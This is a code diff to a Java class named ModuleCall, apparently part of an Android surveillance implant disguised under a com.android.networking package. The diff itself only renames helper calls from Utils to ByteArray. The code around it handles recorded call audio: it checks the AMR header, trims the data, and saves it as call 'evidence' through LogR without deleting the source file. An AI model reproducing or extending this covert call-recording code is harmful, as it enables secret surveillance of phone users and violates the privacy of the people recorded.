@@ -29,10 +29,10 @@ import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerCall;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 public class ModuleCall extends BaseModule implements Observer<Call> {
@@ -196,7 +196,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			int offset = 0;
 			byte[] header = file.read(0, 6);
 
-			if (Utils.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
+			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveCallEvidence): AMR header");
 				}
@@ -207,16 +207,16 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			int pos = checkIntegrity(data);
 			
 			if (pos != data.length) {
-				data = Utils.copy(data, 0, pos);
+				data = ByteArray.copy(data, 0, pos);
 			}
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
-				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + Utils.byteArrayToHex(data).substring(0, 20));
+				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
 			
 			new LogR(EvidenceType.CALL, additionaldata, data);
-			new LogR(EvidenceType.CALL, additionaldata, Utils.intToByteArray(0xffffffff));
+			new LogR(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
